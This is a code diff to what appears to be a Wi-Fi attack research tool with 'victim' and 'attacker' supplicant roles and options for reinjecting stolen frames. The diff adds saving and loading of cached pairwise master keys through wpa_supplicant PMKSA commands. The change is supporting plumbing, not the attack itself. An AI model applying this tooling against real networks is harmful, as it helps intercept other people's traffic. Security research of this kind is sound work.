@@ -5,7 +5,7 @@
 # See README for more details.
 
 from libwifi import *
-import abc, sys, os, socket, struct, time, argparse, heapq, subprocess, atexit, select, threading, shutil, signal
+import abc, sys, os, socket, struct, time, argparse, heapq, subprocess, atexit, select, json, threading, shutil, signal
 from datetime import datetime
 from wpaspy import Ctrl
 from libwifi.crypto import encrypt_ccmp
@@ -266,6 +266,8 @@ class Supplicant(Daemon):
 
 		self.eth_handler = None
 
+		self.pmksa_list = dict()
+
 
 	def attacker(self, original=False):
 		flip = self.options.flip_id and not original
@@ -387,6 +389,67 @@ class Supplicant(Daemon):
 			quit(1)
 
 
+	def pmksa_import(self, pmk_file):
+		if not os.path.exists(pmk_file): return
+
+		with open(pmk_file, "r", encoding="utf-8") as fp:
+			self.pmksa_list = {pmksa['pmkid']: pmksa for pmksa in json.load(fp)}
+
+		for pmksa in self.pmksa_list.values():
+			# Convert readable time to internal representation
+			pmksa['creation_time'] = datetime.strptime(pmksa['creation_time'], "%Y-%m-%d %H:%M:%S").timestamp()
+
+			# Warn about old PMKDs
+			time_created = pmksa['creation_time']
+			time_str = datetime.fromtimestamp(time_created).strftime("%Y-%m-%d %H:%M:%S")
+			if time.time() - time_created > pmksa['expiration']:
+				log(WARNING, f"PMK {pmksa['pmkid']} was created on {time_str} and may be expired")
+
+			# Send the PMKs to wpa_supplicant
+			netid = self.victim(original=True).netid if pmksa['id_str'] == "victim" else self.attacker(original=True).netid
+			cmd = f"PMKSA_ADD {netid} {pmksa['bssid']} {pmksa['pmkid']} {pmksa['pmk']} 86400 86400 {pmksa['akmp']} {pmksa['okc']}"
+			self.wpaspy_command(cmd)
+
+
+	def __pmksa_export_netid(self, netid, id_str):
+		# TODO: Handle a list of PMKs by making wpa_supplicant output a special EOF or empty line on request
+		result = self.wpaspy_command(f"PMKSA_GET {netid}", can_fail=True)
+		if len(result) == 0: return []
+
+		bssid, pmkid, pmk, reauth_time, expiration, akmp, okc = result.split()[:7]
+		pmksa_to_export = [{
+			'id_str': id_str,
+			'bssid': bssid,
+			'pmkid': pmkid,
+			'pmk': pmk,
+			'reauth_time': int(reauth_time),
+			'expiration': int(expiration),
+			'akmp': akmp,
+			'okc': okc
+		}]
+
+		# Carry over original creation times if this was a previously-imported PMKSA
+		for pmksa in pmksa_to_export:
+			pmkid = pmksa['pmkid']
+			if pmkid in self.pmksa_list:
+				creation_time = self.pmksa_list[pmkid]['creation_time']
+			else:
+				creation_time = time.time()
+
+			# For export, we want this in readable format
+			pmksa['creation_time'] = datetime.fromtimestamp(creation_time).strftime("%Y-%m-%d %H:%M:%S")
+
+		return pmksa_to_export
+
+
+	def pmksa_export(self, pmk_file):
+		pmksa_list  = self.__pmksa_export_netid(self.victim(original=True).netid, "victim")
+		pmksa_list += self.__pmksa_export_netid(self.attacker(original=True).netid, "attacker")
+
+		with open(pmk_file, "w", encoding="utf-8") as fp:
+			json.dump(pmksa_list, fp, indent=2, ensure_ascii=False)
+
+
 	def start(self):
 		log(STATUS, "Note: remember to disable Wi-Fi in your network manager so it doesn't interfere with this script")
 		subprocess.check_output(["rfkill", "unblock", "wifi"])
@@ -420,6 +483,9 @@ class Supplicant(Daemon):
 		self.wpaspy_command(f"SET scan_res_valid_for_connect 3600")
 
 		self.sock_eth = L2Socket(type=ETH_P_ALL, iface=self.nic_iface)
+
+		if self.options.pmk_file is not None:
+			self.pmksa_import(self.options.pmk_file)
 
 
 	def scan(self, wait=True):
@@ -770,6 +836,10 @@ class Supplicant(Daemon):
 		# Store the BSSID that was used (in case the config didn't explicitly specify it)
 		status = self.status()
 		self.victim().bssid = status['bssid']
+
+		if self.options.pmk_file:
+			self.pmksa_export(self.options.pmk_file)
+			quit(1)
 
 		self.get_ip_address()
 		self.send_tcp_syn()
@@ -1435,6 +1505,7 @@ def main():
 	parser.add_argument('--reinject-reflection', default=False, action="store_true", help="Reinject stolen frames via broadcast reflection.")
 	parser.add_argument('--reinject-gtk', help="Third interface to reinject stolen frames via GTK abuse.")
 	parser.add_argument('--c2c-pcap-output', help='Write sup_attacker capture to pcap via dumpcap/tcpdump')
+	parser.add_argument('--pmk-file', nargs="?", const="pmk.json", default=None, help='Load and write cached PMKSAs to/from this file')
 
 	options = parser.parse_args()
 
